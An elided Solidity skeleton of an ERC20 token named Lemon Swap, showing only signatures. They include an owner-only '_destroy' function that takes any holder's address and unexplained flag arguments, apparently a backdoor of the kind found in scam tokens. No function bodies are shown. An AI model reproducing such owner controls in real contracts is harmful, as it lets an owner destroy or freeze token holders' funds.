...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _burnTheLemons(address account, uint256 amount) internal {
    ...
    function _destroy(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
...
contract ERC20Lemon is Context, ERC20 {
    constructor(
...
contract LemonSwap is ERC20Lemon {
    constructor() ERC20Lemon("Lemon Swap", "lemonSWAP", false, true, 1000, 30, msg.sender, 200000000 * 10 ** 18, msg.sender, 2) {
    }
}